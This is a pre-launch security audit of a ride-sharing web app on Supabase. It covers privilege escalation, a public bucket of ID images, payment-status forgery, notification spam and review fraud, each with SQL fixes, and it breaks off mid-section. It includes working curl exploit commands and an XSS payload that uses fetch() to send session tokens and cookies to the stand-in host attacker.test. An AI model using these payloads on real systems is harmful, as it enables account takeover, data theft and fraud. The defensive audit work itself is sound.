# مِشوار — Pre-Launch Production Audit

**Audit date:** 2026-05-05
**Auditor scope:** Senior security, architecture, DevOps, QA, performance, privacy, mobile/web release
**Repo head audited:** `921c445` on `main` (HEAD before this report)
**Production URL:** https://mishwar-nu.vercel.app
**Backend:** Supabase project `dimtdwahtwaslmnuakij`
**Audit method:** Static analysis of repo; SQL/RLS review; cross-reference with handoff brief and live RLS state described therein. No runtime penetration testing performed.

---

## 0. Executive summary

**Verdict: NO-GO. Do not launch in current state.**

The app has the bones of a serious product — the React/Supabase architecture is sensible, RLS is enabled on every business table, deployment headers are mostly right, and the social-safety surface (block, report, deleted-user gate) is in good shape. But the audit surfaced **ten critical, exploitable defects**, four of which are remotely exploitable by any signed-up user with no special tools. Two are GDPR-blocking. One is a reflected XSS that bypasses the existing Content-Security-Policy because the CSP itself is too permissive to help.

The single most damaging finding is **trivial privilege escalation**: any authenticated user can promote themselves to `admin` with one PostgREST PATCH because the `profiles_update` RLS policy lacks a `WITH CHECK` clause that constrains the `role` column. Once admin, the same user can read every message, broadcast notifications to the whole user base, reject licenses, and pull payment data.

The second most damaging is **driver licenses and selfie photos stored in a public Storage bucket**. These contain government-ID PII. Any URL that has been emitted by the app (in chat history, server logs, browser history, OG tags) is permanently public-readable, and the bucket policies allow any authenticated account to enumerate, overwrite, or delete arbitrary files.

The third is **financial integrity**: the `bookings` UPDATE policy lets passengers mark their own bookings as `payment_status='paid'` directly via PostgREST, without going through `process_booking_payment` or any driver confirmation. Combined with the reviewer-not-required-to-have-booked review system, the trust signals on the marketplace are forgeable.

Once those three classes of issue are closed, a second pass on the remaining 7 critical findings, the App Store / Play Store privacy disclosures, and the listed high-severity items would put the app within reach of a soft-launch. Realistic pre-launch effort: **2–3 weeks for one full-stack engineer plus a lawyer for policy drafting**.

### Severity counts

| Severity | Count | Description |
|---|---|---|
| **CRITICAL** | 10 | Exploitable, data loss, regulatory, or App Store blockers — must fix before any public traffic |
| **HIGH** | 12 | Significant security/compliance/UX risk; fix within first 2 weeks of beta |
| **MEDIUM** | 14 | Quality, scalability, and operational risks; fix in first 30 days |
| **LOW** | 11 | Cleanup, nice-to-have, observable as friction not failure |

### Launch-readiness scorecard

| Domain | Score (/10) | Rationale |
|---|---|---|
| Security | **2** | Privilege escalation, XSS, public PII bucket, financial integrity holes |
| Privacy & compliance | **3** | No legal review, account-deletion flow doesn't satisfy GDPR Art. 17, location disclosure missing |
| Stability | **6** | RLS enabled, error boundaries present, but Sentry is a stub and the realtime pub channel errors loop |
| Performance | **7** | Code-split, chunked, sensible bundle sizes; route caching needs work |
| Scalability | **5** | RLS hits N+1 in places (notifications/messages join), no query-side caching, no rate limiting |
| UX quality | **8** | RTL polish is real, error states exist, recent UX commits closed loops |
| Production ops | **3** | No monitoring, no alerts, no rollback runbook, no on-call |
| Store readiness | **2** | No Capacitor wrapper, no privacy nutrition labels, no IAP exemption rationale on file, no permission strings |
| **Composite** | **4.5/10** | **Not launch-ready.** |

### Go / No-Go

**No-go for public launch.** Conditional **go for closed beta** (≤50 invited users, no real money, signed waiver) **only after** the 10 critical issues are closed. The app has too many easy escalation paths to expose to the open internet before the first round of fixes lands.

---

## 1. Critical findings (launch blockers)

### C-01 — Privilege escalation via user-editable `profiles.role` column

**Severity:** CRITICAL. Trivially exploitable by any signed-up user.

**Location:** `supabase-production.sql:35` (column definition) + `supabase-production.sql:373` (RLS policy).

**The policy:**
```sql
CREATE POLICY "profiles_update" ON public.profiles
  FOR UPDATE TO authenticated USING (id = auth.uid());
```

There is **no `WITH CHECK` clause and no column-level grant restriction**. Postgres falls back to using the `USING` predicate as `WITH CHECK`, which only verifies the new row's `id` still equals `auth.uid()` — it does **not** prevent column-level value changes.

**Exploit (one HTTP call):**
```bash
curl -X PATCH \
  "${SUPABASE_URL}/rest/v1/profiles?id=eq.${MY_UUID}" \
  -H "apikey: ${ANON_KEY}" \
  -H "Authorization: Bearer ${MY_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Why it matters:** `auth_user_role()` is the gate for every admin RLS policy in the system (`supabase-production.sql` references it 31 times). Once `role='admin'`, the attacker:
- Reads every user's DMs (`messages_select` allows admins)
- Broadcasts notifications to every user (`broadcast_notification` RPC just checks `auth_user_role()`)
- Deletes any review, booking, or trip
- Writes to `app_settings` (changing hero slides, app name, commission rate)
- Writes to `admin_audit_log` masquerading as another admin
- Approves their own driver license
- Impersonates support replies on tickets
- Reads `bank_iban`, `jawwal_pay_number`, `reflect_number` for every driver

This is the single most dangerous defect in the codebase.

**Fix (minimum, deployable today):**
```sql
-- 1. Constrain WITH CHECK to forbid role / deleted_at / id changes
DROP POLICY IF EXISTS "profiles_update" ON public.profiles;
CREATE POLICY "profiles_update" ON public.profiles
  FOR UPDATE TO authenticated
  USING  (id = auth.uid())
  WITH CHECK (
    id = auth.uid()
    AND role        = (SELECT role        FROM public.profiles WHERE id = auth.uid())
    AND deleted_at IS NOT DISTINCT FROM (SELECT deleted_at FROM public.profiles WHERE id = auth.uid())
    AND email      = (SELECT email       FROM public.profiles WHERE id = auth.uid())
  );

-- 2. Defense-in-depth trigger that REJECTS non-admin attempts to change role
CREATE OR REPLACE FUNCTION public.guard_profile_protected_columns()
RETURNS TRIGGER
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, pg_catalog
AS $$
BEGIN
  IF (OLD.role IS DISTINCT FROM NEW.role
      OR OLD.email IS DISTINCT FROM NEW.email
      OR OLD.deleted_at IS DISTINCT FROM NEW.deleted_at)
     AND coalesce((SELECT role FROM public.profiles WHERE id = auth.uid()), 'user') <> 'admin'
  THEN
    RAISE EXCEPTION 'Modifying protected columns (role/email/deleted_at) requires admin'
      USING ERRCODE = 'insufficient_privilege';
  END IF;
  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS guard_profile_protected_columns ON public.profiles;
CREATE TRIGGER guard_profile_protected_columns
  BEFORE UPDATE ON public.profiles
  FOR EACH ROW EXECUTE FUNCTION public.guard_profile_protected_columns();

-- 3. Audit existing admins — confirm only intended accounts have role='admin'
SELECT id, email, full_name, role, created_at
FROM public.profiles WHERE role = 'admin' ORDER BY created_at;
```

After deploy, immediately verify by attempting the exploit above with a normal user JWT — it should return `42501 insufficient_privilege`.

---

### C-02 — Reflected XSS in `/api/og` endpoint

**Severity:** CRITICAL. Pre-auth, no special tools required.

**Location:** `api/og.js`

**The defect:**
```js
if (title) {
  html = html.replace(/<title>[^<]*<\/title>/, `<title>${title}</title>`);
  html = html.replace(/(<meta property="og:title" content=")[^"]*"/, `$1${title}"`);
  ...
}
if (description) {
  html = html.replace(/(<meta name="description" content=")[^"]*"/, `$1${description}"`);
  ...
}
```

`title`, `description`, and `url` are pulled directly from `req.query` and substituted into HTML **without any escaping**. Compare to `api/trip.js`, which has a proper `esc()` helper — `og.js` does not.

**Exploit:**
```
https://mishwar-nu.vercel.app/api/og?title=</title><script>fetch('//attacker.test/x',{method:'POST',body:JSON.stringify({s:localStorage,c:document.cookie})})</script><title>x
```

When the victim clicks, the attacker exfiltrates the Supabase session token (key `sb-dimtdwahtwaslmnuakij-auth-token` in localStorage) and any cookies. With the access token they can act as the victim against the Supabase REST API for the lifetime of the JWT (typically 1 hour, refreshable).

**Why CSP doesn't save this:** `vercel.json` ships `script-src 'self' 'unsafe-inline' 'unsafe-eval' ...`. `unsafe-inline` makes inline scripts execute. The CSP is decorative.

**Fix:**
```js
function esc(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;")
    .replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

export default function handler(req, res) {
  const { title, description } = req.query;
  // Length caps so an attacker can't paste a megabyte
  const t = esc(String(title || "").slice(0, 200));
  const d = esc(String(description || "").slice(0, 400));
  // ... use t, d in replacements ...
}
```

**Hard ask:** also tighten CSP — `unsafe-inline` and `unsafe-eval` are not needed for a Vite-built app and should be removed. See **H-01**.

---

### C-03 — Driver license images and selfies are stored in a PUBLIC bucket

**Severity:** CRITICAL. Active PII leak. GDPR Article 32 violation, App Store privacy review blocker.

**Location:** `supabase-storage-fix.sql:7-19` (bucket config), `src/pages/Onboarding.jsx:26`, `src/pages/AccountSettings.jsx:270`, `src/api/base44Client.js:495`.

**The defect:** the `uploads` bucket is created with `public = TRUE`. Driver license images and selfie verification photos go to this bucket via `supabase.storage.from('uploads').upload(...)` and the URL pattern is:
```
https://dimtdwahtwaslmnuakij.supabase.co/storage/v1/object/public/uploads/<path>
```

Once an admin reviewer or another user has been emitted a license URL (in admin email notifications, server logs, browser history, OG link previews on shared chats, or even in Supabase's own logs), that URL is permanently public. Anyone on the internet who guesses or learns the path can fetch the image. License photos contain: full legal name, date of birth, government ID number, residential address, and biometric face data. This is a **special category of personal data** under most privacy regimes.

**Compounding defect — storage object policies:**
```sql
CREATE POLICY "Authenticated users can upload files"
  ON storage.objects FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'uploads');                 -- no path / owner check

CREATE POLICY "Authenticated users can update files"
  ON storage.objects FOR UPDATE TO authenticated
  USING (bucket_id = 'uploads');                      -- ANY authed user can overwrite ANY file

CREATE POLICY "Authenticated users can delete files"
  ON storage.objects FOR DELETE TO authenticated
  USING (bucket_id = 'uploads');                      -- ANY authed user can DELETE ANY file
```

So a malicious account can:
1. **Enumerate** licenses by trying timestamp-prefixed paths (uploads typically use `Date.now()`).
2. **Replace** an approved driver's license with an invalid image to break their dashboard.
3. **Delete** all hero slideshow images, all car photos, all avatars on a whim.
4. **Overwrite** another user's avatar with offensive content.

**Fix (multi-step, all required):**

1. **Migrate licenses + selfies to a private bucket.** Create `uploads-private` with `public=FALSE`. License upload paths move there; the admin license-review UI fetches via signed URLs (`createSignedUrl(path, 60)` valid 60 seconds).

2. **Path-namespace by uploader UUID.** Object keys must be prefixed `<auth.uid()>/...`. Then enforce in policy:

   ```sql
   DROP POLICY IF EXISTS "Authenticated users can upload files" ON storage.objects;
   DROP POLICY IF EXISTS "Authenticated users can update files" ON storage.objects;
   DROP POLICY IF EXISTS "Authenticated users can delete files" ON storage.objects;

   CREATE POLICY "users_upload_own_folder"
     ON storage.objects FOR INSERT TO authenticated
     WITH CHECK (
       bucket_id IN ('uploads','uploads-private')
       AND (storage.foldername(name))[1] = auth.uid()::text
     );

   CREATE POLICY "users_update_own_files"
     ON storage.objects FOR UPDATE TO authenticated
     USING (
       bucket_id IN ('uploads','uploads-private')
       AND owner = auth.uid()
     );

   CREATE POLICY "users_delete_own_files"
     ON storage.objects FOR DELETE TO authenticated
     USING (
       bucket_id IN ('uploads','uploads-private')
       AND owner = auth.uid()
     );

   -- Public read only on `uploads` (avatars, car photos, hero slides)
   CREATE POLICY "public_read_uploads"
     ON storage.objects FOR SELECT
     USING (bucket_id = 'uploads');

   -- Private-bucket read: only owner or admin
   CREATE POLICY "private_read_owner_or_admin"
     ON storage.objects FOR SELECT TO authenticated
     USING (
       bucket_id = 'uploads-private'
       AND (owner = auth.uid() OR public.auth_user_role() = 'admin')
     );
   ```

3. **Audit existing license URLs.** Pull every `license_image_url`, `front_image_url`, `back_image_url`, and selfie field from `driver_licenses` and `profiles`. Any URL containing `/object/public/` is leaked. Move those files to private bucket and update the row to the new path. The leaked URL may already be cached at attackers/SEO/Supabase logs but at least new fetches stop working.

4. **Notify affected drivers.** Per most privacy regimes, drivers whose ID images were stored publicly are entitled to notice.

5. **Add MIME and size validation server-side.** Bucket-level `allowed_mime_types` is set, which is good — but validate file content (magic bytes) at minimum on the admin review side to catch image-renamed-as-jpg containing scripts or polyglots.

---

### C-04 — Financial integrity: passengers can self-mark bookings as paid

**Severity:** CRITICAL. Direct revenue leakage and dispute amplification.

**Location:** `supabase-production.sql:434` (`bookings_update` RLS).

**The defect:**
```sql
CREATE POLICY "bookings_update" ON public.bookings
  FOR UPDATE TO authenticated
  USING (
    passenger_email = public.auth_user_email()
    OR trip_id IN (SELECT id::text FROM public.trips WHERE driver_email = public.auth_user_email())
    OR public.auth_user_role() = 'admin'
  );
```

Again, **no `WITH CHECK`, no column restriction**. A passenger can `PATCH` their own booking row and set `payment_status='paid'`, `paid_at=NOW()`, `payment_method='cash'`, bypassing the `process_booking_payment` RPC and any driver confirmation:

```bash
curl -X PATCH \
  "${SUPABASE_URL}/rest/v1/bookings?id=eq.${MY_BOOKING}" \
  -H "apikey: ${ANON_KEY}" -H "Authorization: Bearer ${MY_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"payment_status":"paid","paid_at":"2026-05-05T10:00:00Z"}'
```

Same issue lets a passenger:
- Change `seats_booked` (already-confirmed booking, then ride with extra people)
- Change `status` from `cancelled` back to `confirmed` after the driver cancelled them
- Set `refund_status='completed'` to make the system think they were already refunded

A driver, conversely, can mark their passengers `no_show=true` to invalidate refunds en masse.

**Fix:** introduce a `WITH CHECK` clause that limits which columns each role can change. Postgres RLS doesn't have native column-level WITH CHECK, so the cleanest fix is a BEFORE UPDATE trigger that whitelists transitions:

```sql
CREATE OR REPLACE FUNCTION public.guard_booking_updates()
RETURNS TRIGGER
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, pg_catalog
AS $$
DECLARE
  caller_email TEXT := public.auth_user_email();
  is_passenger BOOLEAN := OLD.passenger_email = caller_email;
  is_driver    BOOLEAN := EXISTS (SELECT 1 FROM trips
                                  WHERE id::text = OLD.trip_id
                                    AND driver_email = caller_email);
  is_admin     BOOLEAN := public.auth_user_role() = 'admin';
BEGIN
  IF is_admin THEN RETURN NEW; END IF;

  -- Passenger can only cancel their own booking, nothing else
  IF is_passenger AND NOT is_driver THEN
    IF NEW.payment_status   IS DISTINCT FROM OLD.payment_status   THEN RAISE EXCEPTION 'passengers cannot change payment_status';   END IF;
    IF NEW.paid_at          IS DISTINCT FROM OLD.paid_at          THEN RAISE EXCEPTION 'passengers cannot change paid_at';          END IF;
    IF NEW.payment_method   IS DISTINCT FROM OLD.payment_method   THEN RAISE EXCEPTION 'passengers cannot change payment_method';   END IF;
    IF NEW.refund_status    IS DISTINCT FROM OLD.refund_status    THEN RAISE EXCEPTION 'passengers cannot change refund_status';    END IF;
    IF NEW.no_show          IS DISTINCT FROM OLD.no_show          THEN RAISE EXCEPTION 'passengers cannot change no_show';          END IF;
    IF NEW.seats_booked     IS DISTINCT FROM OLD.seats_booked     THEN RAISE EXCEPTION 'passengers cannot change seats_booked';     END IF;
    IF NEW.passenger_email  IS DISTINCT FROM OLD.passenger_email  THEN RAISE EXCEPTION 'passengers cannot change passenger_email';  END IF;
    IF NEW.trip_id          IS DISTINCT FROM OLD.trip_id          THEN RAISE EXCEPTION 'passengers cannot change trip_id';          END IF;
    -- Allow status transitions only into 'cancelled'
    IF NEW.status IS DISTINCT FROM OLD.status AND NEW.status <> 'cancelled' THEN
      RAISE EXCEPTION 'passengers can only cancel their own bookings';
    END IF;
  END IF;

  -- Driver can confirm/cancel/no_show; cannot retroactively change passenger
  IF is_driver AND NOT is_passenger THEN
    IF NEW.passenger_email  IS DISTINCT FROM OLD.passenger_email  THEN RAISE EXCEPTION 'drivers cannot change passenger_email';  END IF;
    IF NEW.trip_id          IS DISTINCT FROM OLD.trip_id          THEN RAISE EXCEPTION 'drivers cannot change trip_id';          END IF;
    IF NEW.seats_booked     IS DISTINCT FROM OLD.seats_booked     THEN RAISE EXCEPTION 'drivers cannot change seats_booked';     END IF;
    IF NEW.refund_status    IS DISTINCT FROM OLD.refund_status    THEN RAISE EXCEPTION 'drivers cannot mark refunds';    END IF;
  END IF;

  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS guard_booking_updates ON public.bookings;
CREATE TRIGGER guard_booking_updates
  BEFORE UPDATE ON public.bookings
  FOR EACH ROW EXECUTE FUNCTION public.guard_booking_updates();
```

Same pattern applies to **C-04b** (`trips_update_driver`): driver can change `driver_email` to someone else, change `price` retroactively (after passengers booked), or flip `status`. Add an analogous BEFORE UPDATE guard on `trips`.

---

### C-05 — Account deletion does not anonymize email; GDPR Art. 17 not satisfied

**Severity:** CRITICAL. Regulatory; also **breaks** the deleted-user message gate I just shipped in `921c445`.

**Location:** `src/pages/AccountSettings.jsx:282-400` (the actual code path UI uses), vs. `supabase-production.sql:1118` (the unused RPC).

**The defect:** the codebase has two account-deletion paths:
- The DB RPC `delete_user_account(uuid)` correctly anonymizes email to `deleted-{uuid}@deleted.local` (lines 1129).
- The UI in `AccountSettings.jsx` calls Supabase REST directly with `supabase.from("profiles").update({...})` and **does not touch the email field at all**.

The UI path is what runs in production. So:
- Deleted users keep their original email on `profiles`, on `auth.users`, on past `messages.sender_email`, on `bookings.passenger_email`, on `trips.driver_email`, on `notifications.user_email`.
- The deleted-user RLS gate (`messages_block_send_to_deleted` checks `receiver_email !~~ '%@deleted.local'`) **never fires** for users deleted through the UI because their emails don't match the pattern.
- The client-side composer lock and toast that landed in `921c445` likewise never trigger.
- A deleted user can be re-activated by setting `deleted_at = NULL` — full restoration of all their data, since nothing was actually erased.
- GDPR Article 17 right-to-erasure is not honored.
- App Store Guideline 5.1.1(v) "Account deletion that fully removes the account" is not satisfied.

**Fix:**
1. Stop calling Supabase directly from the UI for deletion. Call the RPC.
2. Extend the RPC to additionally:
   - `UPDATE auth.users SET email = ('deleted-' || id || '@deleted.local'), encrypted_password = '' WHERE id = user_id_param` (requires service-role — the RPC has SECURITY DEFINER so it can do this, but you must explicitly grant it permission on the auth schema).
   - Update all denormalized email columns: `messages.sender_email/receiver_email`, `messages.sender_name/receiver_name`, `bookings.passenger_email/passenger_name`, `trips.driver_email/driver_name`, `notifications.user_email/created_by`, `reviews.reviewer_email/reviewed_email`, `user_blocks.blocker_email/blocked_email`, `user_reports.reporter_email/reported_email`, `support_tickets.user_email`.
   - Hard-delete or anonymize free-text fields containing PII that was once entered: `bio` (already nulled), but also `support_tickets.message`, `messages.content` if requested.
3. Re-test the deleted-user message gate end-to-end after migrating an existing soft-deleted account through the new flow.
4. Add a **deletion grace window** if you want to support re-activation: set `deletion_grace_until = now() + interval '30 days'`, then a daily cron permanently anonymizes.

**Important nuance:** "anonymize but keep trip history visible to other users" is a defensible design choice (you don't want a passenger's own past trip-receipts to disappear when their counterparty deletes), but the email + name on the *counterparty's* row must be anonymized for GDPR. The fix above does exactly that.

---

### C-06 — Race condition allows seat overbooking

**Severity:** CRITICAL for marketplace integrity. Easily exploited at scale.

**Location:** `src/pages/TripDetails.jsx:106-113` (client) + `supabase-triggers.sql:11-56` (trigger).

**The defect:** the booking flow is non-atomic.

```js
// TripDetails.jsx — client decrements after insert
seats_booked: 1,
const newSeats = Math.max(0, (tripData.available_seats || 1) - 1);
await base44.entities.Trip.update(tripData.id, { available_seats: newSeats });
```

```sql
-- notify_driver_on_booking trigger fires AFTER INSERT, decrements seats post-hoc:
UPDATE public.trips
SET available_seats = GREATEST(0, COALESCE(available_seats, 1) - COALESCE(NEW.seats_booked, 1))
WHERE id = trip_record.id;
```

Both paths are **post-hoc**. There is no `SELECT ... FOR UPDATE` lock, no constraint on `bookings` that references current `available_seats`, and no precondition check before the row is inserted. Two passengers tapping "Book" simultaneously on a 1-seat trip both succeed.

There is also a redundancy: the client decrements **and** the trigger decrements, with no coordination. If the client's stale `tripData.available_seats` is 3 (pre-trigger) and the trigger has just set it to 2, the client overwrites it back to 2 → and a third concurrent booking sees 2 instead of 1.

**Fix:** replace the client-side decrement and the AFTER-INSERT trigger with a single atomic RPC:

```sql
CREATE OR REPLACE FUNCTION public.book_seat(
  p_trip_id      UUID,
  p_seats        INTEGER DEFAULT 1,
  p_pickup_city  TEXT DEFAULT NULL,
  p_dropoff_city TEXT DEFAULT NULL,
  p_notes        TEXT DEFAULT NULL
) RETURNS public.bookings
LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, pg_catalog
AS $$
DECLARE
  v_trip   trips%ROWTYPE;
  v_email  TEXT := public.auth_user_email();
  v_name   TEXT;
  v_book   bookings;
BEGIN
  IF v_email IS NULL THEN RAISE EXCEPTION 'not authenticated'; END IF;
  IF p_seats < 1 OR p_seats > 6 THEN RAISE EXCEPTION 'invalid seat count'; END IF;

  -- Lock the trip row for the duration of the transaction
  SELECT * INTO v_trip FROM trips WHERE id = p_trip_id FOR UPDATE;
  IF NOT FOUND                          THEN RAISE EXCEPTION 'trip not found'; END IF;
  IF v_trip.status <> 'confirmed'        THEN RAISE EXCEPTION 'trip not bookable'; END IF;
  IF v_trip.driver_email = v_email       THEN RAISE EXCEPTION 'cannot book your own trip'; END IF;
  IF v_trip.available_seats < p_seats    THEN RAISE EXCEPTION 'not enough seats'; END IF;

  SELECT full_name INTO v_name FROM profiles WHERE email = v_email;

  INSERT INTO bookings (trip_id, passenger_email, passenger_name, seats_booked,
                        pickup_city, dropoff_city, notes, status, payment_status)
  VALUES (p_trip_id::text, v_email, v_name, p_seats,
          p_pickup_city, p_dropoff_city, p_notes, 'confirmed', 'pending')
  RETURNING * INTO v_book;

  UPDATE trips SET available_seats = available_seats - p_seats,
                   updated_at = NOW()
  WHERE id = p_trip_id;

  RETURN v_book;
END $$;

REVOKE ALL ON FUNCTION public.book_seat FROM public, anon;
GRANT EXECUTE ON FUNCTION public.book_seat TO authenticated;
```

Then in `TripDetails.jsx`:
```js
const { data, error } = await supabase.rpc('book_seat', {
  p_trip_id: trip.id, p_seats: 1, p_pickup_city: pickup, p_dropoff_city: dropoff
});
```

Drop the `notify_driver_on_booking` trigger's `UPDATE trips` block (notification side stays). Drop the client-side `Trip.update`. The new RPC is the single source of truth.

---

### C-07 — Notification spam vector

**Severity:** CRITICAL. Harassment, phishing, and operational pain.

**Location:** `supabase-production.sql:514`.

```sql
CREATE POLICY "notifications_insert" ON public.notifications
  FOR INSERT TO authenticated WITH CHECK (true);
```

`WITH CHECK (true)` means **any authenticated user can insert a notification with any `user_email`**. An attacker can:

1. Spam a victim's notification feed with hundreds of harassing messages.
2. Forge "system" notifications mimicking the app: `{type:'system', title:'تم تجميد حسابك', message:'اضغط هنا للتحقق: https://attacker.test'}` — perfect phishing.
3. Mass-send to every registered email, bypassing the admin-only `broadcast_notification` RPC.

The base44Client.js gating I read at `src/api/base44Client.js:207-235` is **client-side only** — it can be skipped by calling PostgREST directly.

**Fix:** allow only self-targeted notifications, system inserts (via service-role / SECURITY DEFINER triggers), and admin broadcasts:

```sql
DROP POLICY IF EXISTS "notifications_insert" ON public.notifications;
CREATE POLICY "notifications_insert" ON public.notifications
  FOR INSERT TO authenticated
  WITH CHECK (
    user_email = public.auth_user_email()       -- self-notify (rare, e.g. saved-search alerts)
    OR public.auth_user_role() = 'admin'        -- admin can target anyone
  );
```

All cross-user notifications (driver-on-new-booking, license-status-change, etc.) already run via SECURITY DEFINER triggers, which bypass RLS. The only legitimate authenticated-user-to-other-user notification cases I see in the brief are the report-flow admin notifications and the chat-message gateways — both should be migrated to SECURITY DEFINER RPCs.

---

### C-08 — Review fraud: any user can review any user without ever booking

**Severity:** CRITICAL for marketplace trust.

**Location:** `supabase-production.sql:459`.

```sql
CREATE POLICY "reviews_insert" ON public.reviews
  FOR INSERT TO authenticated
  WITH CHECK (reviewer_email = public.auth_user_email());
```

The only check is "reviewer is whoever you're authenticated as." There is no FK or trigger that requires the reviewer to have an actual completed `booking` between themselves and the `driver_email`/`reviewed_email`. The `update_driver_rating` trigger then auto-recalculates `profiles.total_rating`.

So:
- A driver creates 50 throwaway accounts and 5-stars themselves: rating goes to 5.0 instantly.
- A competitor 1-stars a target driver from any account: rating tanks.
- A passenger a driver banned from their car can leave a 1-star review forever, even months after the ban.

**Fix:** add a precondition trigger:

```sql
CREATE OR REPLACE FUNCTION public.guard_review_must_have_booking()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, pg_catalog
AS $$
BEGIN
  -- Skip for admin overrides (admins shouldn't normally insert reviews, but allow break-glass)
  IF public.auth_user_role() = 'admin' THEN RETURN NEW; END IF;

  IF NEW.review_type = 'passenger_rates_driver' THEN
    IF NOT EXISTS (
      SELECT 1 FROM public.bookings b
      JOIN public.trips t ON t.id::text = b.trip_id
      WHERE b.passenger_email = NEW.reviewer_email
        AND t.driver_email    = NEW.driver_email
        AND b.status IN ('completed','confirmed')
        AND t.status IN ('completed')
    ) THEN
      RAISE EXCEPTION 'cannot review a driver you have not ridden with';
    END IF;
  ELSIF NEW.review_type = 'driver_rates_passenger' THEN
    IF NOT EXISTS (
      SELECT 1 FROM public.bookings b
      JOIN public.trips t ON t.id::text = b.trip_id
      WHERE t.driver_email     = NEW.reviewer_email
        AND b.passenger_email  = NEW.reviewed_email
        AND b.status IN ('completed','confirmed')
        AND t.status IN ('completed')
    ) THEN
      RAISE EXCEPTION 'cannot review a passenger who has not ridden with you';
    END IF;
  END IF;

  -- One review per (reviewer, reviewed, trip) combo
  IF EXISTS (
    SELECT 1 FROM public.reviews
    WHERE reviewer_email = NEW.reviewer_email
      AND COALESCE(reviewed_email, driver_email) = COALESCE(NEW.reviewed_email, NEW.driver_email)
      AND trip_id = NEW.trip_id
  ) THEN
    RAISE EXCEPTION 'review already submitted for this trip';
  END IF;

  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS guard_review_must_have_booking ON public.reviews;
CREATE TRIGGER guard_review_must_have_booking
  BEFORE INSERT ON public.reviews
  FOR EACH ROW EXECUTE FUNCTION public.guard_review_must_have_booking();
```

(Schema details: I assumed `reviewed_email` is the column name for "passenger being reviewed by driver." Verify against the actual schema; the name may be `passenger_email`.)

Also add a unique index to enforce the one-review-per-trip rule at the storage layer:

```sql
CREATE UNIQUE INDEX IF NOT EXISTS uq_reviews_one_per_trip_per_direction
  ON public.reviews (reviewer_email, COALESCE(reviewed_email, driver_email), trip_id, review_type);
```

---

### C-09 — Receivers can edit message content

**Severity:** CRITICAL for evidence integrity. Loosely coupled to harassment / abuse reports.

**Location:** `supabase-production.sql:486`.

```sql
CREATE POLICY "messages_update" ON public.messages
  FOR UPDATE TO authenticated
  USING (
    sender_email = public.auth_user_email()
    OR receiver_email = public.auth_user_email()
  );
```

Receivers can update messages they received. There is no `WITH CHECK` constraining what they can change. So:
- A receiver can edit the **content** of a message they got, then screenshot the doctored version to file a fraudulent harassment report.
- A receiver can flip `is_read` (intended use case) — but also `sender_name`, `sender_email`, `created_at`.

Combined with the admin-can-read-all-messages policy and the fact that admin actions are themselves auditable but message *contents* aren't versioned, this is a hole in any future safety review.

**Fix:** split sender vs receiver permissions. Receiver may only flip `is_read`:

```sql
DROP POLICY IF EXISTS "messages_update" ON public.messages;

CREATE POLICY "messages_update_sender_content" ON public.messages
  FOR UPDATE TO authenticated
  USING  (sender_email = public.auth_user_email())
  WITH CHECK (sender_email = public.auth_user_email());

CREATE POLICY "messages_update_receiver_read_only" ON public.messages
  FOR UPDATE TO authenticated
  USING  (receiver_email = public.auth_user_email())
  WITH CHECK (receiver_email = public.auth_user_email());

CREATE OR REPLACE FUNCTION public.guard_message_receiver_columns()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER SET search_path = public, pg_catalog
AS $$
BEGIN
  IF OLD.receiver_email = public.auth_user_email()
     AND OLD.sender_email <> public.auth_user_email()
     AND public.auth_user_role() <> 'admin'
  THEN
    -- Only is_read may change for receivers
    IF NEW.content       IS DISTINCT FROM OLD.content       THEN RAISE EXCEPTION 'cannot edit content as receiver'; END IF;
    IF NEW.sender_email  IS DISTINCT FROM OLD.sender_email  THEN RAISE EXCEPTION 'cannot edit sender_email'; END IF;
    IF NEW.sender_name   IS DISTINCT FROM OLD.sender_name   THEN RAISE EXCEPTION 'cannot edit sender_name'; END IF;
    IF NEW.created_at    IS DISTINCT FROM OLD.created_at    THEN RAISE EXCEPTION 'cannot edit timestamps'; END IF;
    IF NEW.trip_id       IS DISTINCT FROM OLD.trip_id       THEN RAISE EXCEPTION 'cannot edit trip_id'; END IF;
  END IF;
  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS guard_message_receiver_columns ON public.messages;
CREATE TRIGGER guard_message_receiver_columns
  BEFORE UPDATE ON public.messages
  FOR EACH ROW EXECUTE FUNCTION public.guard_message_receiver_columns();
```

Better yet, rethink whether senders should be able to edit either. WhatsApp-style "edited" visibility (`edited_at` non-null, history retained in audit) is the safest. Out of scope for pre-launch but worth filing.

---

### C-10 — Privacy policy contradicts actual GPS use; App Store privacy review will reject

**Severity:** CRITICAL for Apple App Store / Google Play submission.

**Location:** `src/pages/PrivacyPolicy.jsx:14` + `src/lib/gpsTracking.js:99`.

The privacy policy states (translated): *"We do not collect real-time location data."*

The app actually calls `navigator.geolocation.watchPosition` during active trips to detect arrival.

**Why it matters:** even though the GPS data appears to never leave the device (haversine math runs locally and there's no transmit), the **collection** of location data by the application — even ephemerally for in-process logic — must be disclosed in:
- Apple App Privacy nutrition label ("Location" data type, "Used for: App Functionality")
- Google Play Data Safety section (same)
- Privacy policy (must mention what's collected, why, and where it goes — even if "stays on device")

App Store reviewers compare the privacy policy text against the actual permission requests at runtime. A direct contradiction is an automatic rejection.

**Additional disclosures missing:**
- The app reads localStorage (auth tokens) — fine but should be disclosed under "essential cookies / similar technologies."
- License images are uploaded to Supabase (third-party processor) — must list Supabase as a sub-processor.
- Nominatim and Valhalla geocoding services are called (`mapUtils.js:175`, `:226`) — third-party processors, must be disclosed; `from_city` / `to_city` text is sent to OpenStreetMap.
- Future Sentry usage will need disclosure when wired.

**Fix:** rewrite the privacy policy with a lawyer who knows Palestinian law + GDPR + CCPA. Pending item already on the brief's roadmap. The cost (~$200-500 noted) is extremely cheap insurance — don't ship without it.

Concrete language to add to section 1:
